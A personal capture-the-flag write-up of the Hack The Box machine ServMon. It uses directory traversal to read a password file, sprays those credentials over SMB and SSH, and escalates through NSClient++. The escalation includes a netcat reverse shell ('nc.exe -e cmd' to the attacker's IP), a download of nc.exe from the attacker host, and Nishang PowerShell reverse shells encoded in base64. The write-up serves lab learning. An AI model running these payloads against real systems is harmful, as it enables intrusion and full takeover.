- When pinging it we will get a TTL of 127 
- Windows TTL is usually 128 so this box is likely windows
- Default TTL for linux is 64 (ping localhost)
## Reconnaissance
## Nmap Enumeration
- Pass these commands:
```bash
nmap -sV -sC -vv 10.10.10.184
nmap -sU -vv --top-ports=10 10.10.10.184

---OUTPUT-TCPPORT     STATE SERVICE       REASON          VERSION
21/tcp   open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  07:35PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp   open  ssh           syn-ack ttl 127 OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLqFnd0LtYC3vPEYbWRZEOTBIpA++rGtx7C/R2/f2Nrro7eR3prZWUiZm0zoIEvjMl+ZFTe7UqziszU3tF8v8YeguZ5yGcWwkuJCCOROdiXt37INiwgFnRaiIGKg4hYzMcGrhQT/QVx53KZPNJHGuTl18yTlXFvQZjgPk1Bc/0JGw9C1Dx9abLs1zC03S4/sFepnECbfnTXzm28nNbd+VI3UUe5rjlnC4TrRLUMAtl8ybD2LA2919qGTT1HjUf8h73sGWdY9rrfMg4omua3ywkQOaoV/KWJZVQvChAYINM2D33wJJjngppp8aPgY/1RfVVXh/asAZJD49AhTU+1HSvBHO6K9/Bh6p0xWgVXhjuEd0KUyCwRqkvWAjxw5xrCCokjYcOEZ34fA+IkwPpK4oQE279/Y5p7niZyP4lFVl5cu0J9TfWUcavL44neyyNHNSJPOLSMHGgGs10GsfjqCdX0ggjhxc0RqWa9oZZtlVtsIV5WR6MyRsUPTV6N8NRDD8=
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA5iE0EIBy2ljOhQ42zqa843noU8K42IIHcRa9tFu5kUtlUcQ9CghqmRG7yrLjEBxJBMeZ3DRL3xEXH0K5rCRGY=
|   256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN6c7yYxNJoV/1Lp8AQeOGoJrtQ6rgTitX0ksHDoKjhn
80/tcp   open  http          syn-ack ttl 127
|_http-title: Site doesn't have a title (text/html).
|_http-favicon: Unknown favicon MD5: 3AEF8B29C4866F96A539730FAB53A88F
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 127
5666/tcp open  tcpwrapped    syn-ack ttl 127
6699/tcp open  tcpwrapped    syn-ack ttl 127
8443/tcp open  ssl/https-alt syn-ack ttl 127
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2020-01-14T13:24:20
| Not valid after:  2021-01-13T13:24:20
| MD5:   1d03:0c40:5b7a:0f6d:d8c8:78e3:cba7:38b4
| SHA-1: 7083:bd82:b4b0:f9c0:cc9c:5019:2f9f:9291:4694:8334
| -----BEGIN CERTIFICATE-----
| MIICoTCCAYmgAwIBAgIBADANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAlsb2Nh
| bGhvc3QwHhcNMjAwMTE0MTMyNDIwWhcNMjEwMTEzMTMyNDIwWjAUMRIwEAYDVQQD
| DAlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDXCoMi
| kUUWbCi0E1C/LfZFrm4UKCheesOFUAITOnrCvfkYmUR0o7v9wQ8yR5sQR8OIxfJN
| vOTE3C/YZjPE/XLFrLhBpb64X83rqzFRwX7bHVr+PZmHQR0qFRvrsWoQTKcjrElo
| R4WgF4AWkR8vQqsCADPuDGIsNb6PyXSru8/A/HJSt5ef8a3dcOCszlm2bP62qsa8
| XqumPHAKKwiu8k8N94qyXyVwOxbh1nPcATwede5z/KkpKBtpNfSFjrL+sLceQC5S
| wU8u06kPwgzrqTM4L8hyLbsgGcByOBeWLjPJOuR0L/a33yTL3lLFDx/RwGIln5s7
| BwX8AJUEl+6lRs1JAgMBAAEwDQYJKoZIhvcNAQEFBQADggEBAAjXGVBKBNUUVJ51
| b2f08SxINbWy4iDxomygRhT/auRNIypAT2muZ2//KBtUiUxaHZguCwUUzB/1jiED
| s/IDA6dWvImHWnOZGgIUsLo/242RsNgKUYYz8sxGeDKceh6F9RvyG3Sr0OyUrPHt
| sc2hPkgZ0jgf4igc6/3KLCffK5o85bLOQ4hCmJqI74aNenTMNnojk42NfBln2cvU
| vK13uXz0wU1PDgfyGrq8DL8A89zsmdW6QzBElnNKpqNdSj+5trHe7nYYM5m0rrAb
| H2nO4PdFbPGJpwRlH0BOm0kIY0az67VfOakdo1HiWXq5ZbhkRm27B2zO7/ZKfVIz
| XXrt6LA=
|_-----END CERTIFICATE-----
| http-title: NSClient++
|_Requested resource was /index.html
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|_    Location: /index.html
2 services unrecognized despite returning data.---


---OUTPUT-UDP---
123/udp  open|filtered ntp          no-response
135/udp  open|filtered msrpc        no-response
137/udp  open|filtered netbios-ns   no-response
138/udp  open|filtered netbios-dgm  no-response
```
- Services:
- FTP*
- SSH
- HTTP
- msrpc (135)
- netbios-ssn (139) [SMB]
- microsoft-ds? (445)
- SSL (8443)
- 5666 (NRPE?), 6699
## Directory Enumeration
- We don't really find much..gobuster also doesn't work as everything we send responds with status 200 OK so we checked with others but nothing of value came of it. (tried gobuster, ffuf, dirsearch)
## Website Enumeration
- NVMS-1000 (has vulnerability : CVE-2019-2008 - Directory Traversal and also Priv Esc ( we tried but failed Priv esc))
- Login screen
- Login test: unknown username or password
- Burpsuite doesn't reveal much..input encoded in base64 and some xml code
- Searchsploit:
```bash
searchsploit nvms

---OUTPUT---
--------------------------------------------------------------------- -----------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- -----------
NVMS 1000 - Directory Traversal                                      | hardware/webapps/47774.txt
OpenVms 5.3/6.2/7.x - UCX POP Server Arbitrary File Modification     | multiple/local/21856.txt
OpenVms 8.3 Finger Service - Stack Buffer Overflow                   | multiple/dos/32193.txt
TVT NVMS 1000 - Directory Traversal                                  | hardware/webapps/48311.py
--------------------------------------------------------------------- -----------
```
- We see a directory traversal vulnerability
- On Burpsuite we try to access what's written in the exploitdb text file and we get some output
```bash
POST /../../../../../../../../../../../../windows/win.ini HTTP/1.1
---OUTPUT---
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```
## SMB Enumeration
- to test:
```bash
smbclient -U '' -L //10.10.10.184
smbclient -U 'guest' -L //10.10.10.184
smbclient -U 'anonymous' -L //10.10.10.184
```
- We get nothing
## FTP Enumeration
- username: anonymous
- password: anonymous
```bash
ftp 10.10.10.186
cd Users
dir
cd Nadine
get Confidential.txt
cd ..
cd Nathan
get Notes\ to\ do.txt
```
- Confidential.txt 
```bash
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```
- Notes to do.txt 
```bash
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```
- We try to access Desktop (not available in ftp)
- based on our searchsploit which revealed a directory traversal vulnerability we try to access the file on BurpSuite
```bash
GET /../../../../../../Users/Nathan/Desktop/Passwords.txt HTTP/1.1

---OUTPUT---
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```
- We use crackmap exec to try out smb again with these credentials (as port 139 is open)
```bash
vi users.txt # copy users Nadine and Nathan
vi passwords.txt # Copy the passwords.txt file contents
crackmapexec smb 10.10.10.184 -u users.txt -p passwords.txt
crackmapexec ssh 10.10.10.184 -u users.txt -p passwords.txt

---OUTPUT-SMB---
SMB      10.10.10.184     445    SERVMON    [+] ServMon\Nadine:L1k3B1gBut7s@W0rk

---OUTPUT-SSH---
SSH         10.10.10.184    22     10.10.10.184     [+] Nadine:L1k3B1gBut7s@W0rk
```
- We try smbclient with these credentials:
```bash
smbclient -U Nadine -L //10.10.10.184
> Password: L1k3B1gBut7s@W0rk

---OUTPUT---
Password for [WORKGROUP\Nadine]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC

```
- We ssh into the machine as Nadine and get user flag
```bash
ssh Nadine@10.10.10.184
> yes >Enter Password<
cd Desktop
type user.txt
```
- We see Microsoft Version upon login : `Microsoft Windows [Version 10.0.17763.864]`
## Initial Foothold Enumeration
- We perform some commands:
```bash
systeminfo
---OUTPUT---
Access Denied
```
- But we know microsoft version (upon login) and we can google it and find the system information from that
- Windows 10 October 2018 Update
- Enumerating we find
```bash
cd c: > Program Files > NSClient++
type nsclient.ini

---OUTPUT---
; Undocumented key
password = ew2x6SsGTxjRwXOT

; Undocumented key
allowed hosts = 127.0.0.1

; External script settings - General settings for the external scripts module (CheckExternalScripts).  
[/settings/external scripts]
allow arguments = true

```
- we get a password and see it is for something NSClient++ running on localhost
- We execute the executable and check the web password:
```bash
nscp.exe web password --display

---OUTPUT---
Shows the same password
```
- When we access https://10.10.10.184:8443
- we reach NSClient++ login page (it's a bit slow)
- If we click forgot password we get:
```bash
#### NSClient++ password

The NSClient++ password can be found by running:

nscp web -- password --display

or you can sett a new password:

nscp web -- password --set new-password
```
- We login with the passwword we have
- We get "you're not allowed - 403" response
- this is because it can only be accessed via localhost
- so we need to tunnel it to our localhost at a port
```bash
~C # Escape character (has to be enabled in ~/.ssh/config ["EnableEscapeCommandline=yes"])
-L 8443:127.0.0.1:8443

--OR--
just reconnect with ssh with the above arguments
```
- The credentials now work
----
## Privilege Escalation 
**Note: messing ith the script and putting in bad values may crash the site and may require a reset**
- We try to create a script:
	![[Pasted image 20250404195548.png]]
- After writing we click add, then save changes, and reload the site
- alternatively we can pass sc.exe stop/start nscp in target machine
- Then we should find out Query under Queries tab. (rocknrj is the query name for me)
- In target system we pull netcat
```bash
---LOCAL-SYSTEM---
cp /usr/share/windows-resources/binaries/nc.exe .
python3-m http.server 8001

--ON-TARGET--
curl 10.10.14.25:8001/nc.exe -o nc.exe
echo C:\temp\nc.exe -e cmd 10.10.14.25 9999 > exploit.bat
```
- we can test it be executing exploit.bat (just type it) and having netcat listening
- we will gain access as nadine
- Then we run the command via the website with netcat listening
- Queries > rocknrj > run
- We get reverse shell as nt authority\system
- we find root.txt in C:\Users\Administrator\Desktop\root.txt
-------
## Failed Priv Esc
- We tried to first test via ping,
```bash
echo 'ping -n 1 10.10.10.184' | iconv -t UTF16LE | base64 -w 0
```
- We copied this output to our exploit.bat
```bash
echo powershell -enc <base64_code> > exploit.bat
```
- Then we tried to run the command on website and listened for icmp request on our network interface
```bash
sudo tcpdump -i tun0 icmp
```
- We got a response
- Then we tried to input our reverse shell 
- https://github.com/samratashok/nishang/tree/master
- i git cloned it in my /usr/share
```bash
cp /usr/share/nishang/Shell/Invoke-PowerShellTcpOneLine.ps1 .
OR
cp /usr/share/nishang/Shell/Invoke-PowerShellTcp.ps1 .
```
- Then encoded it in base64
```bash
cat Invoke-PowerShellTcp.ps1 | iconv -t UTF16LE | base64 -w 0
```
- And performed the steps before
- We get reverse shell for a second but its unusable
- maybe the first command worked so maybe it is possible
- When trying to execute exploit.bat in target it responds with AV detecting it as malicious
- Author meant for us to priv esc via API so this route isn't meant to work
- Initially in IPPSec he also used this along with
```bash
powershell -EncodedCommand <base64_text>
```
- Also find out why we use iconv -t UTF16LE
- PowerShell expects:

- The original command to be encoded in UTF-16 Little Endian (UTF-16LE),

- Then base64 encoded.
- So if we do without iconv... it will simply encode in utf8
